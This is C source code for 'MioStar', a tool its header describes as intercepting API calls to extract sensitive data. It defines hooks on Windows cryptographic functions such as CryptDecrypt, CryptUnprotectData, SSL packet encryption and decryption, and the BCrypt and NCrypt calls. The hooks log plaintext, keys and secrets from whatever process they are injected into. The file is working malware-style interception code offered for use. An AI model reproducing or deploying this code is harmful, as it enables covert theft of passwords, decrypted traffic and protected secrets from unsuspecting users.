/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */





#include <windows.h>
#include <stdio.h>
#include "MioStar.h"
#include "Crypt32Replacement.h"

extern byte* CG_DecryptFileA;
extern byte* CG_DecryptFileW;
extern byte* CG_CryptEncrypt;
extern byte* CG_CryptDecrypt;
extern byte* CG_EncryptFileA;
extern byte* CG_EncryptFileW;
extern byte* CG_BCryptEncrypt;
extern byte* CG_BCryptDecrypt;
extern byte* CG_BCryptHashData;
extern byte* CG_BCryptGenerateSymmetricKey;
extern byte* CG_NCryptEncrypt;
extern byte* CG_NCryptDecrypt;
extern byte* CG_NCryptCreatePersistedKey;
extern byte* CG_SslDecryptPacket;
extern byte* CG_SslEncryptPacket;
extern byte* CG_CryptHashData;
extern byte* CG_CryptCreateHash;
extern byte* CG_CPEncrypt;
extern byte* CG_CPDecrypt;
extern byte* CG_CryptProtectData;
extern byte* CG_CryptUnprotectData;
extern byte* CG_CryptProtectMemory;
extern byte* CG_CryptUnprotectMemory;
extern byte* CG_CryptMsgOpenToDecode;
extern byte* CG_CryptMsgGetParam;
extern byte* CG_CryptMsgUpdate;
extern byte* CG_CryptHashMessage;
extern byte* CG_CryptDecryptMessage;
extern byte* CG_CryptEncryptMessage;

extern char gProcName[MAX_BUF_SIZE + 1];
extern char *gProcShortPath;





/*
 *
 *
 */

BOOL WINAPI MyEncryptFileA(LPCSTR lpFileName)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYENCRYPTFILEA fEncryptFileA = (MYENCRYPTFILEA) CG_EncryptFileA;

  ZeroMemory(lTemp1, sizeof(lTemp1));

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyEncryptFileA():CRYPT:%s:%s", gProcShortPath, lpFileName);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fEncryptFileA)
    lRetVal = fEncryptFileA(lpFileName);

  return(lRetVal);
}



/*
 *
 *
 */

BOOL WINAPI MyEncryptFileW(LPCWSTR lpFileName)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYENCRYPTFILEW fEncryptFileW = (MYENCRYPTFILEW) CG_EncryptFileW;

  ZeroMemory(lTemp1, sizeof(lTemp1));

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyEncryptFileW():CRYPT:%s:%s", gProcShortPath, lpFileName);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fEncryptFileW)
    lRetVal = fEncryptFileW(lpFileName);

  return(lRetVal);
}




/*
 *
 *
 */

BOOL WINAPI MyDecryptFileA(LPCSTR lpFileName, DWORD dwReserved)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYDECRYPTFILEA fDecryptFileA = (MYDECRYPTFILEA) CG_DecryptFileA;

  ZeroMemory(lTemp1, sizeof(lTemp1));

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyDecryptFileA():CRYPT:%s:%s", gProcShortPath, lpFileName);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fDecryptFileA)
    lRetVal = fDecryptFileA(lpFileName, dwReserved);

  return(lRetVal);
}





/*
 *
 *
 */

BOOL WINAPI MyDecryptFileW(LPCWSTR lpFileName, DWORD dwReserved)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYDECRYPTFILEW fDecryptFileW = (MYDECRYPTFILEW) CG_DecryptFileW;

  ZeroMemory(lTemp1, sizeof(lTemp1));

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyDecryptFileW():CRYPT:%s:%S", gProcShortPath, lpFileName);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fDecryptFileW)
    lRetVal = fDecryptFileW(lpFileName, dwReserved);

  return(lRetVal);
}




/*
 *
 *
 */

NTSTATUS WINAPI MyBCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_KEY_HANDLE *phKey, PUCHAR pbKeyObject, ULONG cbKeyObject, PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags)
{
  NTSTATUS lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYBCRYPTGENERATESYMMETRICKEY fBCryptGenerateSymmetricKey = (MYBCRYPTGENERATESYMMETRICKEY) CG_BCryptGenerateSymmetricKey;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (pbSecret != NULL && cbSecret > 0)
    stringify((char *) pbSecret, cbSecret, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyBCryptGenerateSymmetricKey():CRYPT:%s:%d:%s", gProcShortPath, cbSecret, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fBCryptGenerateSymmetricKey)
    lRetVal = fBCryptGenerateSymmetricKey(hAlgorithm, phKey, pbKeyObject, cbKeyObject, pbSecret, cbSecret, dwFlags);


  return(lRetVal);
}






/*
 *
 *
 */

SECURITY_STATUS WINAPI MyNCryptCreatePersistedKey(NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszAlgId, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags)
{
  SECURITY_STATUS lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYNCRYPTCREATEPERSISTEDKEY fNCryptCreatePersistedKey = (MYNCRYPTCREATEPERSISTEDKEY) CG_NCryptCreatePersistedKey;

  ZeroMemory(lTemp1, sizeof(lTemp1));

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyNCryptCreatePersistedKey():CRYPT:%s:%S", gProcShortPath, pszKeyName);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fNCryptCreatePersistedKey)
    lRetVal = fNCryptCreatePersistedKey(hProvider, phKey, pszAlgId, pszKeyName, dwLegacyKeySpec, dwFlags);


  return(lRetVal);
}



/*
 *
 *
 */

SECURITY_STATUS WINAPI MySslEncryptPacket(NCRYPT_PROV_HANDLE hSslProvider, NCRYPT_KEY_HANDLE hKey, PBYTE *pbInput, DWORD cbInput, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, ULONGLONG SequenceNumber, DWORD dwContentType, DWORD dwFlags)
{
  SECURITY_STATUS lRetVal = FALSE;
  char lTemp1[4 * MAX_BUF_SIZE + 1];
  char lTemp2[4 * MAX_BUF_SIZE + 1];
  MYSSLENCRYPTPACKET fSslEncryptPacket = (MYSSLENCRYPTPACKET) CG_SslEncryptPacket;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (pbInput != NULL && cbInput > 0)
    stringify((char *) pbInput, cbInput, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MySslEncryptPacket():CRYPT:%s:%d:%s", gProcShortPath, cbInput, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fSslEncryptPacket)
    lRetVal = fSslEncryptPacket(hSslProvider, hKey, pbInput, cbInput, pbOutput, cbOutput, pcbResult, SequenceNumber, dwContentType, dwFlags);


  return(lRetVal);
}



/*
 *
 *
 */

SECURITY_STATUS WINAPI MySslDecryptPacket(NCRYPT_PROV_HANDLE hSslProvider, NCRYPT_KEY_HANDLE hKey, PBYTE *pbInput, DWORD cbInput, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, ULONGLONG SequenceNumber, DWORD dwFlags)
{
  SECURITY_STATUS lRetVal = FALSE;
  char lTemp1[4 * MAX_BUF_SIZE + 1];
  char lTemp2[4 * MAX_BUF_SIZE + 1];
  MYSSLDECRYPTPACKET fSslDecryptPacket = (MYSSLDECRYPTPACKET) CG_SslDecryptPacket;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (fSslDecryptPacket)
    lRetVal = fSslDecryptPacket(hSslProvider, hKey, pbInput, cbInput, pbOutput, cbOutput, pcbResult, SequenceNumber, dwFlags);



  if (pbOutput != NULL && cbOutput > 0)
    stringify((char *) pbOutput, cbOutput, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MySslDecryptPacket():CRYPT:%s:%d:%s", gProcShortPath, cbOutput, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  return(lRetVal);
}




/*
 *
 *
 */

NTSTATUS WINAPI MyBCryptHashData(BCRYPT_HASH_HANDLE hHash, PUCHAR pbInput, ULONG cbInput, ULONG dwFlags)
{
  NTSTATUS lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYBCRYPTHASHDATA fBCryptHashData = (MYBCRYPTHASHDATA) CG_BCryptHashData;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (pbInput != NULL && cbInput  > 0)
    stringify((char *) pbInput , cbInput , lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyBCryptHashData():CRYPT:%s:%d:%s", gProcShortPath, cbInput, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fBCryptHashData)
    lRetVal = fBCryptHashData(hHash, pbInput, cbInput, dwFlags);

  return(lRetVal);
}






/*
 *
 *
 */

NTSTATUS WINAPI MyBCryptDecrypt(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput, VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags)
{
  NTSTATUS lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYBCRYPTDECRYPT fBCryptDecrypt = (MYBCRYPTDECRYPT) CG_BCryptDecrypt;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (fBCryptDecrypt)
    lRetVal = fBCryptDecrypt(hKey, pbInput, cbInput, pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, pcbResult, dwFlags);


  if (pbOutput != NULL && cbOutput  > 0)
    stringify((char *) pbOutput , cbOutput , lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyBCryptDecrypt():CRYPT:%s:%d:%s", gProcShortPath, cbOutput, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  return(lRetVal);
}





/*
 *
 *
 */

NTSTATUS WINAPI MyBCryptEncrypt(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput, VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags)
{
  NTSTATUS lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYBCRYPTENCRYPT fBCryptEncrypt = (MYBCRYPTENCRYPT) CG_BCryptEncrypt;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (pbInput != NULL && cbInput  > 0)
    stringify((char *) pbInput , cbInput , lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyBCryptEncrypt():CRYPT:%s:%d:%s", gProcShortPath, cbInput, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fBCryptEncrypt)
    lRetVal = fBCryptEncrypt(hKey, pbInput, cbInput, pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, pcbResult, dwFlags);



  return(lRetVal);
}




/*
 *
 *
 */

SECURITY_STATUS WINAPI MyNCryptDecrypt(NCRYPT_KEY_HANDLE hKey, PBYTE pbInput, DWORD cbInput, VOID *pPaddingInfo, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, DWORD dwFlags)
{
  SECURITY_STATUS lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYNCRYPTDECRYPT fNCryptDecrypt = (MYNCRYPTDECRYPT) CG_NCryptDecrypt;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (fNCryptDecrypt)
    lRetVal = fNCryptDecrypt(hKey, pbInput, cbInput, pPaddingInfo, pbOutput, cbOutput, pcbResult, dwFlags);

  if (pbInput != NULL && cbInput > 0)
    stringify((char *) pbInput, cbInput, lTemp2, sizeof(lTemp2)/2 - 1);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyNCryptDecrypt():CRYPT:%s:%d:%s", gProcShortPath, cbInput, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  return(lRetVal);
}




/*
 *
 *
 */

SECURITY_STATUS WINAPI MyNCryptEncrypt(NCRYPT_KEY_HANDLE hKey, PBYTE pbInput, DWORD cbInput, VOID *pPaddingInfo, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, DWORD dwFlags)
{
  SECURITY_STATUS lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYNCRYPTENCRYPT fNCryptEncrypt = (MYNCRYPTENCRYPT) CG_NCryptEncrypt;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (pbInput != NULL && cbInput > 0)
    stringify((char *) pbInput, cbInput, lTemp2, sizeof(lTemp2)/2 - 1);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyNCryptEncrypt():CRYPT:%s:%d:%s", gProcShortPath, cbInput, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fNCryptEncrypt)
    lRetVal = fNCryptEncrypt(hKey, pbInput, cbInput, pPaddingInfo, pbOutput, cbOutput, pcbResult, dwFlags);

  return(lRetVal);
}




/*
 *
 *
 */


BOOL WINAPI MyCryptCreateHash(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYCRYPTCREATEHASH fCryptCreateHash = (MYCRYPTCREATEHASH) CG_CryptCreateHash;


  ZeroMemory(lTemp1, sizeof(lTemp1));

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptCreateHash():CRYPT:%s", gProcShortPath);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fCryptCreateHash)
    lRetVal = fCryptCreateHash(hProv, Algid, hKey, dwFlags, phHash);

  return(lRetVal);
}




/*
 *
 *
 */

BOOL WINAPI MyCryptHashData(HCRYPTHASH hHash, BYTE *pbData, DWORD dwDataLen, DWORD dwFlags)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCRYPTHASHDATA fCryptHashData = (MYCRYPTHASHDATA) CG_CryptHashData;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (pbData != NULL && dwDataLen > 0)
    stringify((char *) pbData, dwDataLen, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptHashData():CRYPT:%s:%d:%s", gProcShortPath, dwDataLen, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);

  if (fCryptHashData)
    lRetVal = fCryptHashData(hHash, pbData, dwDataLen, dwFlags);

  return(lRetVal);
}





/*
 *
 *
 */

BOOL WINAPI MyCryptEncrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCRYPTENCRYPT fCryptEncrypt = (MYCRYPTENCRYPT) CG_CryptEncrypt;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (pbData != NULL && dwBufLen > 0)
    stringify(pbData, dwBufLen, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptEncrypt():CRYPT:%s:%d:%s", gProcShortPath, dwBufLen, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fCryptEncrypt)
    lRetVal = fCryptEncrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);



  return(lRetVal);
}




/*
 * CryptDecrypt() replacement. 
 * http://msdn.microsoft.com/en-us/library/aa379913(VS.85).aspx
 *
 */

BOOL WINAPI MyCryptDecrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCRYPTDECRYPT fCryptDecrypt = (MYCRYPTDECRYPT) CG_CryptDecrypt;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (fCryptDecrypt)
    lRetVal = fCryptDecrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen);

  if (pbData != NULL && pdwDataLen != NULL && *pdwDataLen > 0)
    stringify(pbData, *pdwDataLen/2, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptDecrypt():CRYPT:%s:%d:%s", gProcShortPath, *pdwDataLen, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  return(lRetVal);
}





/*
 *
 *
 */

BOOL WINAPI MyCPEncrypt(HCRYPTPROV hProv, HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCPENCRYPT fCPEncrypt = (MYCPENCRYPT) CG_CPEncrypt;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (pbData != NULL && *pdwDataLen > 0)
    stringify(pbData, *pdwDataLen, lTemp2, sizeof(lTemp2)/2 - 1);


  if (fCPEncrypt)
    lRetVal = fCPEncrypt(hProv, hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCPEncrypt():CRYPT:%s:%d:%s", gProcShortPath, *pdwDataLen, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  return(lRetVal);
}




/*
 *
 *
 */

BOOL WINAPI MyCPDecrypt(HCRYPTPROV hProv, HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCPDECRYPT fCPDecrypt = (MYCPDECRYPT) CG_CPDecrypt;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (fCPDecrypt)
    lRetVal = fCPDecrypt(hProv, hKey, hHash, Final, dwFlags, pbData, pdwDataLen);


  if (pbData != NULL && *pdwDataLen > 0)
    stringify(pbData, *pdwDataLen, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCPDecrypt():CRYPT:%s:%d:%s", gProcShortPath, *pdwDataLen, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  return(lRetVal);
}





/*
 *
 *
 */

BOOL WINAPI MyCryptProtectData(DATA_BLOB *pDataIn, LPCWSTR szDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  int lDataLength = 0;
  MYCRYPTPROTECTDATA fCryptProtectData = (MYCRYPTPROTECTDATA) CG_CryptProtectData;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (pDataIn != NULL && pDataIn->cbData > 0)
    stringify(pDataIn->pbData, pDataIn->cbData, lTemp2, sizeof(lTemp2)/2 - 1);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptProtectData():CRYPT:%s:%d:%s", gProcShortPath, lDataLength, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fCryptProtectData)
    lRetVal = fCryptProtectData(pDataIn, szDataDescr, pOptionalEntropy, pvReserved, pPromptStruct, dwFlags, pDataOut);

  return(lRetVal);
}





/*
 *
 *
 */

BOOL WINAPI MyCryptUnprotectData(DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  char *mTmpPtr = NULL;
  int lDataLength = 0;
  int lCounter = 0;
  MYCRYPTUNPROTECTDATA fCryptUnprotectData = (MYCRYPTUNPROTECTDATA) CG_CryptUnprotectData;


  ZeroMemory(lTemp1, sizeof(lTemp1));

  if (fCryptUnprotectData)
    lRetVal = fCryptUnprotectData(pDataIn, ppszDataDescr, pOptionalEntropy, pvReserved, pPromptStruct, dwFlags, pDataOut);

  if (pDataOut != NULL && pDataOut->cbData > 0)
    stringify(pDataOut->pbData, pDataOut->cbData, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptUnprotectData():CRYPT:%s:%d:%s", gProcShortPath, lDataLength, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  return(lRetVal);
}



/*
 *
 *
 */

BOOL WINAPI MyCryptProtectMemory(LPVOID pData, DWORD cbData, DWORD dwFlags)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCRYPTPROTECTMEMORY fCryptProtectMemory = (MYCRYPTPROTECTMEMORY) CG_CryptProtectMemory;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (pData != NULL && cbData > 0)
    stringify(pData, cbData, lTemp2, sizeof(lTemp2)/2 - 1);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptProtectMemory():CRYPT:%s:%d:%s", gProcShortPath, cbData, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  if (fCryptProtectMemory)
    lRetVal = fCryptProtectMemory(pData, cbData, dwFlags);


  return(lRetVal);
}





/*
 *
 *
 */

BOOL WINAPI MyCryptUnprotectMemory(LPVOID pData, DWORD cbData, DWORD dwFlags)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCRYPTUNPROTECTMEMORY fCryptUnprotectMemory = (MYCRYPTUNPROTECTMEMORY) CG_CryptUnprotectMemory;

  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));

  if (fCryptUnprotectMemory)
    lRetVal = fCryptUnprotectMemory(pData, cbData, dwFlags);


  if (pData != NULL && cbData > 0)
    stringify(pData, cbData, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptUnprotectMemory():CRYPT:%s:%d:%s", gProcShortPath, cbData, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);


  return(lRetVal);
}






/*
 *
 *
 */

HCRYPTMSG WINAPI MyCryptMsgOpenToDecode(DWORD dwMsgEncodingType, DWORD dwFlags, DWORD dwMsgType, HCRYPTPROV_LEGACY hCryptProv, PCERT_INFO pRecipientInfo, PCMSG_STREAM_INFO pStreamInfo)
{
  HCRYPTMSG lRetVal = 0;
  char lTemp1[MAX_BUF_SIZE + 1];
  MYCRYPTMSGOPENTODECODE fCryptMsgOpenToDecode = (MYCRYPTMSGOPENTODECODE) CG_CryptMsgOpenToDecode;


  ZeroMemory(lTemp1, sizeof(lTemp1));


  if (fCryptMsgOpenToDecode)
    lRetVal = fCryptMsgOpenToDecode(dwMsgEncodingType, dwFlags, dwMsgType, hCryptProv, pRecipientInfo, pStreamInfo);


  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptMsgOpenToDecode():CRYPT:%s", gProcShortPath);
  printDebug(lTemp1, EVENT_CRYPT);

  return(lRetVal);
}






/*
 *
 *
 */

BOOL WINAPI MyCryptMsgGetParam(HCRYPTMSG hCryptMsg, DWORD dwParamType, DWORD dwIndex, void *pvData, DWORD *pcbData)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCRYPTMSGGETPARAM fCryptMsgGetParam = (MYCRYPTMSGGETPARAM) CG_CryptMsgGetParam;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (fCryptMsgGetParam)
    lRetVal = fCryptMsgGetParam(hCryptMsg, dwParamType, dwIndex, pvData, pcbData);

  if (pvData != NULL && pcbData != NULL && *pcbData > 0)
    stringify(pvData, *pcbData, lTemp2, sizeof(lTemp2)/2 - 1);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptMsgGetParam():CRYPT:%s:%d:%s", gProcShortPath, *pcbData, lTemp2);
  printDebug(lTemp1, EVENT_CRYPT);

  return(lRetVal);
}




/*
 *
 *
 */

BOOL WINAPI MyCryptMsgUpdate(HCRYPTMSG hCryptMsg, const BYTE *pbData, DWORD cbData, BOOL fFinal)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[100 * MAX_BUF_SIZE];
  MYCRYPTMSGUPDATE fCryptMsgUpdate = (MYCRYPTMSGUPDATE) CG_CryptMsgUpdate;


  ZeroMemory(lTemp1, sizeof(lTemp1));


  if (pbData != NULL && cbData > 0)
  {
    ZeroMemory(lTemp2, sizeof(lTemp2));
    stringify((void *) pbData, cbData, lTemp2, sizeof(lTemp2)/2 - 1);
    snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptMsgUpdate(PRE):CRYPT:%s:%d:%s:", gProcShortPath, cbData, lTemp2);
    printDebug(lTemp1, EVENT_CRYPT);
  }


  if (fCryptMsgUpdate)
    lRetVal = fCryptMsgUpdate(hCryptMsg, pbData, cbData, fFinal);

  if (pbData != NULL && cbData > 0)
  {
    ZeroMemory(lTemp2, sizeof(lTemp2));
    stringify((void *) pbData, cbData, lTemp2, sizeof(lTemp2)/2 - 1);
    snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptMsgUpdate(POST):CRYPT:%s:%d:%s:", gProcShortPath, cbData, lTemp2);
    printDebug(lTemp1, EVENT_CRYPT);
  }


  return(lRetVal);
}






/*
 *
 *
 */

BOOL WINAPI MyCryptHashMessage(PCRYPT_HASH_MESSAGE_PARA pHashPara, BOOL fDetachedHash, DWORD cToBeHashed, const BYTE *rgpbToBeHashed[], DWORD rgcbToBeHashed[], BYTE *pbHashedBlob, DWORD *pcbHashedBlob, BYTE *pbComputedHash, DWORD *pcbComputedHash)
{
  BOOL lRetVal = FALSE;
  char lTemp1[MAX_BUF_SIZE + 1];
  char lTemp2[MAX_BUF_SIZE + 1];
  MYCRYPTHASHMESSAGE fCryptHashMessage = (MYCRYPTHASHMESSAGE) CG_CryptHashMessage;


  ZeroMemory(lTemp1, sizeof(lTemp1));
  ZeroMemory(lTemp2, sizeof(lTemp2));


  if (fCryptHashMessage)
    lRetVal = fCryptHashMessage(pHashPara, fDetachedHash, cToBeHashed, rgpbToBeHashed, rgcbToBeHashed, pbHashedBlob, pcbHashedBlob, pbComputedHash, pcbComputedHash);

  snprintf(lTemp1, sizeof(lTemp1) - 1, "MyCryptMsgGetParam():CRYPT:%s:%d:%s", gProcShortPath, cToBeHashed, "lTemp2");
  printDebug(lTemp1, EVENT_CRYPT);

  return(lRetVal);
}







/*
 *
 *
 */



